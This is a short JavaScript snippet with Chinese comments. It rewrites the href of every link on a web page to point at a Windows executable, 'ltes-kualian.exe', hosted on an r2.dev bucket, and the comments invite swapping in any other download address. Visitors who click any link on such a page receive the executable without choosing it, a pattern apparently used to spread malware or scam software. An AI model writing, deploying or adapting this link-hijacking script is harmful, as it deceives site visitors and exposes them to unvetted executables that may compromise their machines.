 

var xz = "https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe";

//可以把   https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe  这个改成下载地址；https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe
//可以把   https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe  这个改成文件下载：https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe



var links = document.getElementsByTagName("a");
for (var i = 0; i < links.length; i++) {
    if (links[i].hasAttribute("href")) {
        links[i].href = xz;
    }
} 
